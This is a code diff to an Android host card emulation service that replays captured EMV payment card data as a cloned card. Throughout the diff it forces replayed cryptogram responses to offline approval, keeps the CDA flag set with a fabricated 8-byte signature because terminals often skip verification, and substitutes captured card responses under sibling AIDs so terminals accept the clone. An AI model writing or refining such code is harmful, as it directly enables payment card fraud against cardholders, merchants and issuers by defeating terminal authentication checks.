@@ -33,41 +33,28 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final byte[] SW_ERR         = hex("6F00");
     private static final byte[] PPSE           = hex("325041592E5359532E4444463031");
 
-    /** Placeholder for 9F26 when nothing was computed. FF reads as absent. */
     private static final String AC_FILLER = "FFFFFFFFFFFFFFFF";
 
     /**
-     * NEW. Keep the CDA bit and put a hash in 9F4B instead of claiming nothing.
+     * Keep the CDA bit and put a hash in 9F4B rather than claiming nothing.
      *
-     * A real CDA signature needs the ICC private key and the issuer's certificate
-     * chain, neither of which a clone has. But the bit only tells the terminal to
-     * LOOK, and most kernels do not verify the signature - they check the length
-     * and carry on. Advertising CDA and shipping eight plausible bytes makes the
-     * card look like the plastic instead of like a stripped clone.
+     * A real CDA signature needs the ICC private key, which a clone has not got.
+     * The bit only tells the terminal to LOOK, and most kernels do not verify -
+     * they check the length and carry on. The value is SHA-256 over the AIP, ATC,
+     * PDOL data and PAN, cut to 8 bytes: right shape, not verifiable, and every
+     * log line says sdad=fake so it is never mistaken for real.
      *
-     * The value is SHA-256 over the AIP, ATC, PDOL data and PAN, cut to 8 bytes.
-     * Deterministic per transaction, correct shape, NOT verifiable. The log says
-     * sdad=fake on every GPO so it is never mistaken for real.
-     *
-     * Format 1 (0x80) is skipped - that payload has no TLV structure to append
-     * into, so MSD captures keep the CDA bit cleared.
+     * Skipped on format 1 (no TLV structure to append into) and on a FOREIGN AID
+     * (the AIP bits belong to another kernel).
      */
     private static final boolean CDA_FAKE_SDAD = true;
 
-    /** 0x40 SDA  0x20 DDA  0x01 CDA  0x10 CV  0x08 TRM  0x04 issuer auth */
     private static final String DEFAULT_AIP = "1080";
 
-    /** Keep-mask for aipForMac()'s no-GPO fallback only. */
     private static final byte AIP_KEEP_MASK = (byte) 0x18;
 
-    /**
-     * CDA bit, byte 1.
-     *
-     * FIX: this used to be a single constant, 0x01. That is the Discover and
-     * kernel-6 position. Visa, Mastercard, Amex and JCB put CDA at 0x02 - so on
-     * every Mastercard capture the bit was never actually cleared, and the "CDA
-     * dropped" log line was untrue. The bit now comes from cdaBit(aid).
-     */
+    /** CDA bit. 0x01 is the Discover/kernel-6 position, 0x02 the Visa/MC/Amex/JCB
+     *  one - a single constant here was wrong for every Mastercard. */
     private static final byte AIP_CDA_K6  = (byte) 0x01;
     private static final byte AIP_CDA_K23 = (byte) 0x02;
 
@@ -119,6 +106,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     private boolean sawError;
     private boolean acComputed;
+    private boolean cdaClaimed;
 
     private String lastSelAid = "";
     private int nSelMiss;
@@ -126,8 +114,11 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private int aflEntries;
     private int reqGenP1 = -1;
 
-    /** Whether the last GPO claimed CDA with a fake SDAD. */
-    private boolean cdaClaimed;
+    /** NEW. The terminal picked an AID on a completely different scheme. */
+    private boolean aidForeign;
+
+    /** NEW. The terminal picked a sibling applet on the card's own scheme. */
+    private boolean aidSubst;
 
     private static final String TERM_LOG = "term_log.txt";
 
@@ -293,11 +284,22 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return a;
     }
 
-    /** CDA bit for this AID's kernel. 0x01 on Discover, 0x02 everywhere else. */
+    /** The AID actually in play - the picked one if we substituted or went
+     *  foreign, else the card's. The CDA bit must follow this, not the card. */
+    private String activeAid() {
+        return lastSelAid.isEmpty() ? cardAid() : lastSelAid;
+    }
+
     private static byte cdaBit(String aid) {
         String a = aid == null ? "" : aid.toUpperCase();
         if (a.startsWith("A000000152") || a.startsWith("A000000015")) return AIP_CDA_K6;
         return AIP_CDA_K23;
+    }
+
+    /** First five bytes of the AID - the scheme's registered identifier. */
+    private static String ridOf(String aid) {
+        String a = aid == null ? "" : aid.toUpperCase();
+        return a.length() >= 10 ? a.substring(0, 10) : a;
     }
 
     private String nextAtc() {
@@ -331,6 +333,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
         acComputed = false;
         cdaClaimed = false;
+        aidForeign = false;
+        aidSubst = false;
         lastSelAid = "";
         nSelMiss = 0;
         nApps = 0;
@@ -824,6 +828,21 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
     }
 
+    /**
+     * CHANGED. Three cases instead of two.
+     *
+     * exact  - the card's own AID, captured FCI.
+     * SIBLING - a different applet on the same RID. Same scheme means the same
+     *           record layout and kernel family, so the captured FCI is served
+     *           under the PICKED AID with 9F2A rewritten to that kernel. Logged
+     *           as AID SUBSTITUTED.
+     * FOREIGN - a different RID entirely. Generated FCI, and gpo() will not
+     *           claim CDA because the AIP belongs to another kernel.
+     *
+     * Before this, a sibling selection dead-ended at a generated FCI with a
+     * generic A5 - no PDOL from the plastic, no record match - and the verdict
+     * called it "not the card".
+     */
     private byte[] select(byte[] apdu) {
         int lc = lcOf(apdu);
         int off = dataOff(apdu);
@@ -858,15 +877,28 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
         tap("-- selected " + picked + " | card is " + (real.isEmpty() ? "?" : real));
 
-        boolean match = real.length() > 0 && picked.equalsIgnoreCase(real);
-        if (!match && real.length() > 0) {
+        boolean exact = real.length() > 0 && picked.equalsIgnoreCase(real);
+        boolean sibling = !exact && real.length() >= 10 && picked.length() >= 10
+                && ridOf(picked).equalsIgnoreCase(ridOf(real));
+
+        aidSubst = sibling;
+        aidForeign = !exact && !sibling && real.length() > 0;
+
+        if (!exact && real.length() > 0) {
             nSelMiss++;
-            tap("-- AID MISMATCH: terminal picked an AID the card is not");
+            if (sibling) {
+                tap("-- AID SUBSTITUTED: " + picked + " shares the RID of " + real
+                        + " - serving the captured FCI under the picked AID");
+            } else {
+                tap("-- AID FOREIGN: " + picked + " is a different scheme - generated FCI,"
+                        + " and the GPO AIP will be the card's kernel, not this one");
+            }
         }
 
         byte[] captured = rawFci();
-        if (captured != null && match) {
-            tap("-- fci source: captured " + captured.length + "B");
+        if (captured != null && (exact || sibling)) {
+            tap("-- fci source: captured " + captured.length + "B"
+                    + (sibling ? " (substituted)" : ""));
             return cat(patchFci(captured, name), SW_OK);
         }
         if (captured != null) {
@@ -890,9 +922,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     /**
      * Replay the captured GPO with the CID rewritten to TC.
      *
-     * CHANGED. The CDA bit is now handled per kernel and, when CDA_FAKE_SDAD is
-     * on and the framing is EMV, it is kept and an 9F4B is appended. See the note
-     * on CDA_FAKE_SDAD.
+     * CHANGED. The CDA bit follows the ACTIVE AID, not the card's - on a
+     * substituted sibling the terminal's kernel reads a different bit position.
+     * CDA is claimed only when we are not foreign, because a foreign kernel
+     * interprets the card's AIP bits differently.
      */
     private byte[] gpo(byte[] apdu) {
         byte[] raw = rawGpo();
@@ -916,24 +949,19 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 if (aip != null && aip.length >= 2) {
                     capturedIad = findTag(raw, 0x9F10);
 
-                    byte bit = cdaBit(cardAid());
+                    byte bit = cdaBit(activeAid());
                     weakenAip(raw, bit);
 
                     String sdadNote = "CDA dropped";
 
-                    if (CDA_FAKE_SDAD && !capMsd) {
+                    if (CDA_FAKE_SDAD && !capMsd && !aidForeign) {
                         raiseAip(raw, bit);
-                        int lc = lcOf(apdu);
-                        int off = dataOff(apdu);
-                        byte[] pdol = new byte[0];
-                        if (lc > 0 && apdu.length >= off + lc) {
-                            pdol = Arrays.copyOfRange(apdu, off, off + lc);
-                        }
-                        raw = appendTag(raw, 0x9F4B, fakeSdad(raw, pdol));
+                        raw = appendTag(raw, 0x9F4B, fakeSdad(raw, pdolOf(apdu)));
                         cdaClaimed = true;
                         sdadNote = "CDA kept, sdad=fake";
                     } else {
                         cdaClaimed = false;
+                        if (aidForeign) sdadNote = "CDA dropped (foreign AID)";
                     }
 
                     boolean cidForced = false;
@@ -972,7 +1000,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
         byte[] used = new byte[]{aip[0], aip[1]};
-        used[0] &= (byte) ~cdaBit(cardAid());
+        used[0] &= (byte) ~cdaBit(activeAid());
         txnAip = used;
 
         byte[] a = afl();
@@ -986,28 +1014,26 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
 
         byte[] tpl = cat(tlv(0x82, used), tlv(0x94, a));
-        if (CDA_FAKE_SDAD) {
-            int lc = lcOf(apdu);
-            int off = dataOff(apdu);
-            byte[] pdol = new byte[0];
-            if (lc > 0 && apdu.length >= off + lc) {
-                pdol = Arrays.copyOfRange(apdu, off, off + lc);
-            }
-            used[0] |= cdaBit(cardAid());
-            tpl = cat(tlv(0x82, used), tlv(0x94, a), tlv(0x9F4B, fakeSdad(used, pdol)));
+        if (CDA_FAKE_SDAD && !aidForeign) {
+            used[0] |= cdaBit(activeAid());
+            tpl = cat(tlv(0x82, used), tlv(0x94, a), tlv(0x9F4B, fakeSdad(used, pdolOf(apdu))));
             cdaClaimed = true;
             tap("-- built gpo: CDA kept, sdad=fake");
         }
         return cat(tlv(0x77, tpl), SW_OK);
     }
 
-    /**
-     * NEW. Eight bytes of SHA-256 over the AIP, ATC, PDOL data and PAN.
-     *
-     * Deterministic per transaction and the right length for an SDAD. It is NOT
-     * a signature - nothing can verify it without the ICC private key - but a
-     * kernel that only checks the length and the AIP bit will accept it.
-     */
+    private byte[] pdolOf(byte[] apdu) {
+        int lc = lcOf(apdu);
+        int off = dataOff(apdu);
+        if (lc > 0 && apdu.length >= off + lc) {
+            return Arrays.copyOfRange(apdu, off, off + lc);
+        }
+        return new byte[0];
+    }
+
+    /** Eight bytes of SHA-256 over the AIP, ATC, PDOL data and PAN. Right shape,
+     *  deterministic, NOT a signature - nothing can verify it. */
     private byte[] fakeSdad(byte[] aip, byte[] pdolData) {
         try {
             java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
@@ -1021,7 +1047,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
     }
 
-    /** Clear the CDA bit in the AIP of a captured template, in place. */
     private static void weakenAip(byte[] tpl, byte bit) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1046,7 +1071,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
     }
 
-    /** Set the CDA bit back in the AIP of a captured template, in place. */
     private static void raiseAip(byte[] tpl, byte bit) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1069,7 +1093,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
     }
 
-    /** Rebuild a template with one TLV appended inside the outer tag. */
     private static byte[] appendTag(byte[] tpl, int tag, byte[] val) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1246,12 +1269,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         lastCid = String.format("%02X", cid);
         String atc = txnAtc();
 
-        byte[] cdol = new byte[0];
-        int lc = lcOf(apdu);
-        int off = dataOff(apdu);
-        if (lc > 0 && apdu.length >= off + lc) {
-            cdol = Arrays.copyOfRange(apdu, off, off + lc);
-        }
+        byte[] cdol = pdolOf(apdu);
 
         byte[] ac = computeAc(atc, cdol);
         cryptogramSent = true;
@@ -1337,6 +1355,15 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
         if (nGpos == 0) {
             String picked = lastSelAid.isEmpty() ? "?" : lastSelAid;
+            if (aidForeign) {
+                return "TAP: terminal selected " + picked + ", a DIFFERENT scheme to the card ("
+                        + (cardAid().isEmpty() ? "?" : cardAid())
+                        + ") - it rejected the generated FCI before the GPO";
+            }
+            if (aidSubst) {
+                return "TAP: terminal selected the sibling " + picked + " on the card's own scheme"
+                        + " and still stopped before the GPO - the substituted FCI was rejected";
+            }
             if (nSelMiss > 0) {
                 return "TAP: terminal selected " + picked + ", which is NOT the card ("
                         + (cardAid().isEmpty() ? "?" : cardAid())
@@ -1361,7 +1388,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                     + (gpoCid.isEmpty()
                         ? "check the logged AFL"
                         : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it")
-                    + (cdaClaimed ? " | we claimed CDA with an unverified 9F4B" : "");
+                    + (cdaClaimed ? " | CDA was claimed with an unverified 9F4B" : "")
+                    + (aidForeign ? " | the AID was FOREIGN to this card" : "");
         }
 
         if (aflEntries > 0 && nRecs < aflEntries) {
